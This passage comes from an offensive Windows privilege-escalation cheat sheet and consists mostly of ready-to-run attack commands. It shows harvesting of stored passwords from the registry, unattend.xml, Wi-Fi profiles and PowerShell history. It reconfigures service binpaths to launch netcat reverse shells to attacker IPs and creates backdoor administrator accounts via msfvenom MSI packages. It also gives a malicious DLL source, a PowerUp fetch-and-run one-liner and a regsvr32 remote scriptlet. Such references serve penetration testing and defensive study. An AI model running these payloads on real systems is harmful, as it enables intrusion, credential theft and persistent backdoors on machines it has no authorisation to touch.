\u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026#34; # Windows Autologin reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026#34; 2\u0026gt;nul | findstr \u0026#34;DefaultUserName DefaultDomainName DefaultPassword\u0026#34; reg query \u0026#34;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\u0026#34; # SNMP parameters reg query \u0026#34;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\u0026#34; # Putty clear text proxy credentials reg query \u0026#34;HKCU\\Software\\ORL\\WinVNC3\\Password\u0026#34; # VNC credentials reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s Read a value of a certain sub key # REG QUERY \u0026#34;HKLM\\Software\\Microsoft\\FTH\u0026#34; /V RuleList Passwords in unattend.xml # Location of the unattend.xml files.\nC:\\unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2\u0026gt;nul.\nExample content\n\u0026lt;component name=\u0026#34;Microsoft-Windows-Shell-Setup\u0026#34; publicKeyToken=\u0026#34;31bf3856ad364e35\u0026#34; language=\u0026#34;neutral\u0026#34; versionScope=\u0026#34;nonSxS\u0026#34; processorArchitecture=\u0026#34;amd64\u0026#34;\u0026gt; \u0026lt;AutoLogon\u0026gt; \u0026lt;Password\u0026gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==\u0026lt;/Password\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Username\u0026gt;Administrateur\u0026lt;/Username\u0026gt; \u0026lt;/AutoLogon\u0026gt; \u0026lt;UserAccounts\u0026gt; \u0026lt;LocalAccounts\u0026gt; \u0026lt;LocalAccount wcm:action=\u0026#34;add\u0026#34;\u0026gt; \u0026lt;Password\u0026gt;*SENSITIVE*DATA*DELETED*\u0026lt;/Password\u0026gt; \u0026lt;Group\u0026gt;administrators;users\u0026lt;/Group\u0026gt; \u0026lt;Name\u0026gt;Administrateur\u0026lt;/Name\u0026gt; \u0026lt;/LocalAccount\u0026gt; \u0026lt;/LocalAccounts\u0026gt; \u0026lt;/UserAccounts\u0026gt; Unattend credentials are stored in base64 and can be decoded manually with base64.\n$ echo \u0026#34;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=\u0026#34; | base64 -d SecretSecurePassword1234* The Metasploit module post/windows/gather/enum_unattend looks for these files.\nIIS Web config # Get-Childitem –Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config C:\\inetpub\\wwwroot\\web.config Other files # %SYSTEMDRIVE%\\pagefile.sys %WINDIR%\\debug\\NetSetup.log %WINDIR%\\repair\\sam %WINDIR%\\repair\\system %WINDIR%\\repair\\software, %WINDIR%\\repair\\security %WINDIR%\\iis6.log %WINDIR%\\system32\\config\\AppEvent.Evt %WINDIR%\\system32\\config\\SecEvent.Evt %WINDIR%\\system32\\config\\default.sav %WINDIR%\\system32\\config\\security.sav %WINDIR%\\system32\\config\\software.sav %WINDIR%\\system32\\config\\system.sav %WINDIR%\\system32\\CCM\\logs\\*.log %USERPROFILE%\\ntuser.dat %USERPROFILE%\\LocalS~1\\Tempor~1\\Content.IE5\\index.dat %WINDIR%\\System32\\drivers\\etc\\hosts C:\\ProgramData\\Configs\\* C:\\Program Files\\Windows PowerShell\\* dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b Wifi passwords # Find AP SSID\nnetsh wlan show profile Get Cleartext Pass\nnetsh wlan show profile \u0026lt;SSID\u0026gt; key=clear Oneliner method to extract wifi passwords from all the access point.\ncls \u0026amp; echo. \u0026amp; for /f \u0026#34;tokens=4 delims=: \u0026#34; %a in (\u0026#39;netsh wlan show profiles ^| find \u0026#34;Profile \u0026#34;\u0026#39;) do @echo off \u0026gt; nul \u0026amp; (netsh wlan show profiles name=%a key=clear | findstr \u0026#34;SSID Cipher Content\u0026#34; | find /v \u0026#34;Number\u0026#34; \u0026amp; echo.) \u0026amp; @echo on Sticky Notes passwords # The sticky notes app stores it\u0026rsquo;s content in a sqlite db located at C:\\Users\\\u0026lt;user\u0026gt;\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite\nPasswords stored in services # Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher\nhttps://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1 Import-Module path\\to\\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -o Invoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss Passwords stored in Key Manager # :warning: This software will display its output in a GUI\nrundll32 keymgr,KRShowKeyMgr Powershell History # Disable Powershell history: Set-PSReadlineOption -HistorySaveStyle SaveNothing.\ntype %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type C:\\Users\\swissky\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw Powershell Transcript # C:\\Users\\\u0026lt;USERNAME\u0026gt;\\Documents\\PowerShell_transcript.\u0026lt;HOSTNAME\u0026gt;.\u0026lt;RANDOM\u0026gt;.\u0026lt;TIMESTAMP\u0026gt;.txt C:\\Transcripts\\\u0026lt;DATE\u0026gt;\\PowerShell_transcript.\u0026lt;HOSTNAME\u0026gt;.\u0026lt;RANDOM\u0026gt;.\u0026lt;TIMESTAMP\u0026gt;.txt Password in Alternate Data Stream # PS \u0026gt; Get-Item -path flag.txt -Stream * PS \u0026gt; Get-Content -path flag.txt -Stream Flag EoP - Processes Enumeration and Tasks # What processes are running?\ntasklist /v net start sc query Get-Service Get-Process Get-WmiObject -Query \u0026#34;Select * from Win32_Process\u0026#34; | where {$_.Name -notlike \u0026#34;svchost*\u0026#34;} | Select Name, Handle, @{Label=\u0026#34;Owner\u0026#34;;Expression={$_.GetOwner().User}} | ft -AutoSize Which processes are running as \u0026ldquo;system\u0026rdquo;\ntasklist /v /fi \u0026#34;username eq system\u0026#34; Do you have powershell magic?\nREG QUERY \u0026#34;HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine\u0026#34; /v PowerShellVersion List installed programs\nGet-ChildItem \u0026#39;C:\\Program Files\u0026#39;, \u0026#39;C:\\Program Files (x86)\u0026#39; | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name List services\nnet start wmic service list brief tasklist /SVC Enumerate scheduled tasks\nschtasks /query /fo LIST 2\u0026gt;nul | findstr TaskName schtasks /query /fo LIST /v \u0026gt; schtasks.txt; cat schtask.txt | grep \u0026#34;SYSTEM\\|Task To Run\u0026#34; | grep -B 1 SYSTEM Get-ScheduledTask | where {$_.TaskPath -notlike \u0026#34;\\Microsoft*\u0026#34;} | ft TaskName,TaskPath,State Startup tasks\nwmic startup get caption,command reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\R reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce dir \u0026#34;C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\u0026#34; dir \u0026#34;C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup\u0026#34; EoP - Incorrect permissions in services # A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.\nOften, services are pointing to writeable locations:\nOrphaned installs, not installed anymore but still exist in startup\nDLL Hijacking\n# find missing DLL - Find-PathDLLHijack PowerUp.ps1 - Process Monitor : check for \u0026#34;Name Not Found\u0026#34; # compile a malicious dll - For x64 compile with: \u0026#34;x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\u0026#34; - For x86 compile with: \u0026#34;i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll\u0026#34; # content of windows_dll.c #include \u0026lt;windows.h\u0026gt; BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system(\u0026#34;cmd.exe /k whoami \u0026gt; C:\\\\Windows\\\\Temp\\\\dll.txt\u0026#34;); ExitProcess(0); } return TRUE; } PATH directories with weak permissions\n$ for /f \u0026#34;tokens=2 delims=\u0026#39;=\u0026#39;\u0026#34; %a in (\u0026#39;wmic service list full^|find /i \u0026#34;pathname\u0026#34;^|find /i /v \u0026#34;system32\u0026#34;\u0026#39;) do @echo %a \u0026gt;\u0026gt; c:\\windows\\temp\\permissions.txt $ for /f eol^=^\u0026#34;^ delims^=^\u0026#34; %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \u0026#34;%a\u0026#34; $ sc query state=all | findstr \u0026#34;SERVICE_NAME:\u0026#34; \u0026gt;\u0026gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \u0026#34;tokens=2 delims= \u0026#34; %i in (Servicenames.txt) DO @echo %i \u0026gt;\u0026gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \u0026#34;BINARY_PATH_NAME\u0026#34; \u0026gt;\u0026gt; path.txt Alternatively you can use the Metasploit exploit : exploit/windows/local/service_permissions\nNote to check file permissions you can use cacls and icacls\nicacls (Windows Vista +) cacls (Windows XP)\nYou are looking for BUILTIN\\Users:(F)(Full access), BUILTIN\\Users:(M)(Modify access) or BUILTIN\\Users:(W)(Write-only access) in the output.\nExample with Windows 10 - CVE-2019-1322 UsoSvc # Prerequisite: Service account\nPS C:\\Windows\\system32\u0026gt; sc.exe stop UsoSvc PS C:\\Windows\\system32\u0026gt; sc.exe config usosvc binPath=\u0026#34;C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe 10.10.10.10 4444 -e cmd.exe\u0026#34; PS C:\\Windows\\system32\u0026gt; sc.exe config UsoSvc binpath= \u0026#34;C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe\u0026#34; PS C:\\Windows\\system32\u0026gt; sc.exe config UsoSvc binpath= \u0026#34;cmd /C C:\\Users\\nc.exe 10.10.10.10 4444 -e cmd.exe\u0026#34; PS C:\\Windows\\system32\u0026gt; sc.exe qc usosvc [SC] QueryServiceConfig SUCCESS SERVICE_NAME: usosvc TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START (DELAYED) ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Users\\mssql-svc\\Desktop\\nc.exe 10.10.10.10 4444 -e cmd.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Update Orchestrator Service DEPENDENCIES : rpcss SERVICE_START_NAME : LocalSystem PS C:\\Windows\\system32\u0026gt; sc.exe start UsoSvc Example with Windows XP SP1 - upnphost # # NOTE: spaces are mandatory for this exploit to work ! sc config upnphost binpath= \u0026#34;C:\\Inetpub\\wwwroot\\nc.exe 10.11.0.73 4343 -e C:\\WINDOWS\\System32\\cmd.exe\u0026#34; sc config upnphost obj= \u0026#34;.\\LocalSystem\u0026#34; password= \u0026#34;\u0026#34; sc qc upnphost sc config upnphost depend= \u0026#34;\u0026#34; net start upnphost If it fails because of a missing dependency, try the following commands.\nsc config SSDPSRV start=auto net start SSDPSRV net stop upnphost net start upnphost sc config upnphost depend=\u0026#34;\u0026#34; Using accesschk from Sysinternals or accesschk-XP.exe - github.com/phackt\n$ accesschk.exe -uwcqv \u0026#34;Authenticated Users\u0026#34; * /accepteula RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS $ accesschk.exe -ucqv upnphost upnphost RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS $ sc config \u0026lt;vuln-service\u0026gt; binpath=\u0026#34;net user backdoor backdoor123 /add\u0026#34; $ sc config \u0026lt;vuln-service\u0026gt; binpath= \u0026#34;C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\u0026#34; $ sc stop \u0026lt;vuln-service\u0026gt; $ sc start \u0026lt;vuln-service\u0026gt; $ sc config \u0026lt;vuln-service\u0026gt; binpath=\u0026#34;net localgroup Administrators backdoor /add\u0026#34; $ sc stop \u0026lt;vuln-service\u0026gt; $ sc start \u0026lt;vuln-service\u0026gt; EoP - Windows Subsystem for Linux (WSL) # Technique borrowed from Warlockobama\u0026rsquo;s tweet\nWith root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). Don\u0026rsquo;t know the root password? No problem just set the default user to root W/ .exe \u0026ndash;default-user root. Now start your bind shell or reverse.\nwsl whoami ./ubuntun1604.exe config --default-user root wsl whoami wsl python -c \u0026#39;BIND_OR_REVERSE_SHELL_PYTHON_CODE\u0026#39; Binary bash.exe can also be found in C:\\Windows\\WinSxS\\amd64_microsoft-windows-lxssbash_[...]\\bash.exe\nAlternatively you can explore the WSL filesystem in the folder C:\\Users\\%USERNAME%\\AppData\\Local\\Packages\\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\\LocalState\\rootfs\\\nEoP - Unquoted Service Paths # The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.\nwmic service get name,displayname,pathname,startmode |findstr /i \u0026#34;Auto\u0026#34; |findstr /i /v \u0026#34;C:\\Windows\\\\\u0026#34; |findstr /i /v \u0026#34;\u0026#34;\u0026#34; wmic service get name,displayname,startmode,pathname | findstr /i /v \u0026#34;C:\\Windows\\\\\u0026#34; |findstr /i /v \u0026#34;\u0026#34;\u0026#34; gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \u0026#34;Auto\u0026#34; -and $_.PathName -notlike \u0026#34;C:\\Windows*\u0026#34; -and $_.PathName -notlike \u0026#39;\u0026#34;*\u0026#39;} | select PathName,DisplayName,Name Metasploit exploit : exploit/windows/local/trusted_service_path PowerUp exploit # find the vulnerable application C:\\\u0026gt; powershell.exe -nop -exec bypass \u0026#34;IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://your-site.com/PowerUp.ps1\u0026#39;); Invoke-AllChecks\u0026#34; ... [*] Checking for unquoted service paths... ServiceName : BBSvc Path : C:\\Program Files\\Microsoft\\Bing Bar\\7.1\\BBSvc.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName \u0026#39;BBSvc\u0026#39; -Path \u0026lt;HijackPath\u0026gt; ... # automatic exploit Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command \u0026#34;..\\..\\Users\\Public\\nc.exe 10.10.10.10 4444 -e cmd.exe\u0026#34; Example # For C:\\Program Files\\something\\legit.exe, Windows will try the following paths first:\nC:\\Program.exe C:\\Program Files.exe EoP - $PATH Interception # Requirements:\nPATH contains a writeable folder with low privileges. The writeable folder is before the folder that contains the legitimate binary. EXAMPLE:\n# List contents of the PATH environment variable # EXAMPLE OUTPUT: C:\\Program Files\\nodejs\\;C:\\WINDOWS\\system32 $env:Path # See permissions of the target folder # EXAMPLE OUTPUT: BUILTIN\\Users: GR,GW icacls.exe \u0026#34;C:\\Program Files\\nodejs\\\u0026#34; # Place our evil-file in that folder. copy evil-file.exe \u0026#34;C:\\Program Files\\nodejs\\cmd.exe\u0026#34; Because (in this example) \u0026ldquo;C:\\Program Files\\nodejs\u0026quot; is before \u0026ldquo;C:\\WINDOWS\\system32\u0026quot; on the PATH variable, the next time the user runs \u0026ldquo;cmd.exe\u0026rdquo;, our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder.\nEoP - Named Pipes # Find named pipes: [System.IO.Directory]::GetFiles(\u0026quot;\\\\.\\pipe\\\u0026quot;) Check named pipes DACL: pipesec.exe \u0026lt;named_pipe\u0026gt; Reverse engineering software Send data throught the named pipe : program.exe \u0026gt;\\\\.\\pipe\\StdOutPipe 2\u0026gt;\\\\.\\pipe\\StdErrPipe EoP - Kernel Exploitation # List of exploits kernel : https://github.com/SecWiki/windows-kernel-exploits\n#Security Bulletin #KB #Description #Operating System # MS17-017 [KB4013081]　[GDI Palette Objects Local Privilege Escalation]　(windows 7/8) CVE-2017-8464 [LNK Remote Code Execution Vulnerability]　(windows 10/8.1/7/2016/2010/2008) CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability]　(windows 10/8.1/7/2016/2010/2008) CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2) CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1) MS17-010 [KB4013389]　[Windows Kernel Mode Drivers]　(windows 7/2008/2003/XP) MS16-135 [KB3199135]　[Windows Kernel Mode Drivers]　(2016) MS16-111 [KB3186973]　[kernel api]　(Windows 10 10586 (32/64)/8.1) MS16-098 [KB3178466]　[Kernel Driver]　(Win 8.1) MS16-075 [KB3164038]　[Hot Potato]　(2003/2008/7/8/2012) MS16-034 [KB3143145]　[Kernel Driver]　(2008/7/8/10/2012) MS16-032 [KB3143141]　[Secondary Logon Handle]　(2008/7/8/10/2012) MS16-016 [KB3136041]　[WebDAV]　(2008/Vista/7) MS16-014 [K3134228]　[remote code execution]　(2008/Vista/7) \u0026hellip; MS03-026 [KB823980]　[Buffer Overrun In RPC Interface]　(/NT/2000/XP/2003) To cross compile a program from Kali, use the following command.\nKali\u0026gt; i586-mingw32msvc-gcc -o adduser.exe useradd.c EoP - AlwaysInstallElevated # Check if these registry values are set to \u0026ldquo;1\u0026rdquo;.\n$ reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated $ reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated $ Get-ItemProperty HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer $ Get-ItemProperty HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer Then create an MSI package and install it.\n$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi $ msiexec /quiet /qn /i C:\\evil.msi Technique also available in :\nMetasploit : exploit/windows/local/always_install_elevated PowerUp.ps1 : Get-RegistryAlwaysInstallElevated, Write-UserAddMSI EoP - Insecure GUI apps # Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.\nExample: \u0026ldquo;Windows Help and Support\u0026rdquo; (Windows + F1), search for \u0026ldquo;command prompt\u0026rdquo;, click on \u0026ldquo;Click to open Command Prompt\u0026rdquo;\nEoP - Evaluating Vulnerable Drivers # Look for vuln drivers loaded, we often don\u0026rsquo;t spend enough time looking at this:\n# Native binary PS C:\\Users\\Swissky\u0026gt; driverquery.exe /fo table /si Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 12/10/2006 4:44:38 PM 3ware 3ware Kernel 5/18/2015 6:28:03 PM ACPI Microsoft ACPI Driver Kernel 12/9/1975 6:17:08 AM AcpiDev ACPI Devices driver Kernel 12/7/1993 6:22:19 AM acpiex Microsoft ACPIEx Drive Kernel 3/1/2087 8:53:50 AM acpipagr ACPI Processor Aggrega Kernel 1/24/2081 8:36:36 AM AcpiPmi ACPI Power Meter Drive Kernel 11/19/2006 9:20:15 PM acpitime ACPI Wake Alarm Driver Kernel 2/9/1974 7:10:30 AM ADP80XX ADP80XX Kernel 4/9/2015 4:49:48 PM \u0026lt;SNIP\u0026gt; # https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery PS C:\\Users\\Swissky\u0026gt; DriverQuery.exe --no-msft [+] Enumerating driver services... [+] Checking file signatures... Citrix USB Filter Driver Service Name: ctxusbm Path: C:\\Windows\\system32\\DRIVERS\\ctxusbm.sys Version: 14.11.0.138 Creation Time (UTC): 17/05/2018 01:20:50 Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US Signer: CN=\u0026#34;Citrix Systems, Inc.\u0026#34;, OU=XenApp(ClientSHA256), O=\u0026#34;Citrix Systems, Inc.\u0026#34;, L=Fort Lauderdale, S=Florida, C=US \u0026lt;SNIP\u0026gt; EoP - Printers # Universal Printer # Create a Printer\n$printerName = \u0026#39;Universal Priv Printer\u0026#39; $system32 = $env:systemroot + \u0026#39;\\system32\u0026#39; $drivers = $system32 + \u0026#39;\\spool\\drivers\u0026#39; $RegStartPrinter = \u0026#39;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers\\\u0026#39; + $printerName Copy-Item -Force -Path ($system32 + \u0026#39;\\mscms.dll\u0026#39;) -Destination ($system32 + \u0026#39;\\mimispool.dll\u0026#39;) Copy-Item -Force -Path \u0026#39;.\\mimikatz_trunk\\x64\\mimispool.dll\u0026#39; -Destination ($drivers + \u0026#39;\\x64\\3\\mimispool.dll\u0026#39;) Copy-Item -Force -Path \u0026#39;.\\mimikatz_trunk\\win32\\mimispool.dll\u0026#39; -Destination ($drivers + \u0026#39;\\W32X86\\3\\mimispool.dll\u0026#39;) Add-PrinterDriver -Name \u0026#39;Generic / Text Only\u0026#39; Add-Printer -DriverName \u0026#39;Generic / Text Only\u0026#39; -Name $printerName -PortName \u0026#39;FILE:\u0026#39; -Shared New-Item -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\u0026#39;) | Out-Null New-Item -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Kiwi\u0026#39;) | Out-Null New-ItemProperty -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Kiwi\u0026#39;) -Name \u0026#39;Directory\u0026#39; -PropertyType \u0026#39;String\u0026#39; -Value \u0026#39;x64\\3\u0026#39; | Out-Null New-ItemProperty -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Kiwi\u0026#39;) -Name \u0026#39;Files\u0026#39; -PropertyType \u0026#39;MultiString\u0026#39; -Value (\u0026#39;mimispool.dll\u0026#39;) | Out-Null New-ItemProperty -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Kiwi\u0026#39;) -Name \u0026#39;Module\u0026#39; -PropertyType \u0026#39;String\u0026#39; -Value \u0026#39;mscms.dll\u0026#39; | Out-Null New-Item -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Litchi\u0026#39;) | Out-Null New-ItemProperty -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Litchi\u0026#39;) -Name \u0026#39;Directory\u0026#39; -PropertyType \u0026#39;String\u0026#39; -Value \u0026#39;W32X86\\3\u0026#39; | Out-Null New-ItemProperty -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Litchi\u0026#39;) -Name \u0026#39;Files\u0026#39; -PropertyType \u0026#39;MultiString\u0026#39; -Value (\u0026#39;mimispool.dll\u0026#39;) | Out-Null New-ItemProperty -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Litchi\u0026#39;) -Name \u0026#39;Module\u0026#39; -PropertyType \u0026#39;String\u0026#39; -Value \u0026#39;mscms.dll\u0026#39; | Out-Null New-Item -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Mango\u0026#39;) | Out-Null New-ItemProperty -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Mango\u0026#39;) -Name \u0026#39;Directory\u0026#39; -PropertyType \u0026#39;String\u0026#39; -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Mango\u0026#39;) -Name \u0026#39;Files\u0026#39; -PropertyType \u0026#39;MultiString\u0026#39; -Value $null | Out-Null New-ItemProperty -Path ($RegStartPrinter + \u0026#39;\\CopyFiles\\Mango\u0026#39;) -Name \u0026#39;Module\u0026#39; -PropertyType \u0026#39;String\u0026#39; -Value \u0026#39;mimispool.dll\u0026#39; | Out-Null Execute the driver\n$serverName = \u0026#39;dc.purple.lab\u0026#39; $printerName = \u0026#39;Universal Priv Printer\u0026#39; $fullprinterName = \u0026#39;\\\\\u0026#39; + $serverName + \u0026#39;\\\u0026#39; + $printerName + \u0026#39; - \u0026#39; + $(If ([System.Environment]::Is64BitOperatingSystem) {\u0026#39;x64\u0026#39;} Else {\u0026#39;x86\u0026#39;}) Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue Add-Printer -ConnectionName $fullprinterName PrinterNightmare # git clone https://github.com/Flangvik/DeployPrinterNightmare PS C:\\adversary\u0026gt; FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell [\u0026lt;3] @Flangvik - TrustedSec [+] Copying C:\\Windows\\system32\\mscms.dll to C:\\Windows\\system32\\6cfbaf26f4c64131896df8a522546e9c.dll [+] Copying 64mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\x64\\3\\6cfbaf26f4c64131896df8a522546e9c.dll [+] Copying 32mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\W32X86\\3\\6cfbaf26f4c64131896df8a522546e9c.dll [+] Adding printer driver =\u0026gt; Generic / Text Only! [+] Adding printer =\u0026gt; EasySystemShell! [+] Setting 64-bit Registry key [+] Setting 32-bit Registry key [+] Setting \u0026#39;*\u0026#39; Registry key PS C:\\target\u0026gt; $serverName = \u0026#39;printer-installed-host\u0026#39; PS C:\\target\u0026gt; $printerName = \u0026#39;EasySystemShell\u0026#39; PS C:\\target\u0026gt; $fullprinterName = \u0026#39;\\\\\u0026#39; + $serverName + \u0026#39;\\\u0026#39; + $printerName + \u0026#39; - \u0026#39; + $(If ([System.Environment]::Is64BitOperatingSystem) {\u0026#39;x64\u0026#39;} Else {\u0026#39;x86\u0026#39;}) PS C:\\target\u0026gt; Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue PS C:\\target\u0026gt; Add-Printer -ConnectionName $fullprinterName Bring Your Own Vulnerability # Concealed Position : https://github.com/jacob-baines/concealed_position\nACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE cp_server.exe -e ACIDDAMAGE # Get-Printer # Set the \u0026#34;Advanced Sharing Settings\u0026#34; -\u0026gt; \u0026#34;Turn off password protected sharing\u0026#34; cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE cp_client.exe -l -e ACIDDAMAGE EoP - Runas # Use the cmdkey to list the stored credentials on the machine.\ncmdkey /list Currently stored credentials: Target: Domain:interactive=WORKGROUP\\Administrator Type: Domain Password User: WORKGROUP\\Administrator Then you can use runas with the /savecred options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.\nrunas /savecred /user:WORKGROUP\\Administrator \u0026#34;\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe\u0026#34; runas /savecred /user:Administrator \u0026#34;cmd.exe /k whoami\u0026#34; Using runas with a provided set of credential.\nC:\\Windows\\System32\\runas.exe /env /noprofile /user:\u0026lt;username\u0026gt; \u0026lt;password\u0026gt; \u0026#34;c:\\users\\Public\\nc.exe -nc \u0026lt;attacker-ip\u0026gt; 4444 -e cmd.exe\u0026#34; $secpasswd = ConvertTo-SecureString \u0026#34;\u0026lt;password\u0026gt;\u0026#34; -AsPlainText -Force $mycreds = New-Object System.Management.Automation.PSCredential (\u0026#34;\u0026lt;user\u0026gt;\u0026#34;, $secpasswd) $computer = \u0026#34;\u0026lt;hostname\u0026gt;\u0026#34; [System.Diagnostics.Process]::Start(\u0026#34;C:\\users\\public\\nc.exe\u0026#34;,\u0026#34;\u0026lt;attacker_ip\u0026gt; 4444 -e cmd.exe\u0026#34;, $mycreds.Username, $mycreds.Password, $computer) EoP - Abusing Shadow Copies # If you have local administrator access on a machine try to list shadow copies, it\u0026rsquo;s an easy way for Privilege Escalation.\n# List shadow copies using vssadmin (Needs Admnistrator Access) vssadmin list shadows # List shadow copies using diskshadow diskshadow list shadows all # Make a symlink to the shadow copy and access it mklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\ EoP - From local administrator to NT SYSTEM # PsExec.exe -i -s cmd.exe EoP - Living Off The Land Binaries and Scripts # Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/\nThe goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.\nA LOLBin/Lib/Script must:\nBe a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra \u0026ldquo;unexpected\u0026rdquo; functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses Have functionality that would be useful to an APT or red team wmic.exe process call create calc regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll 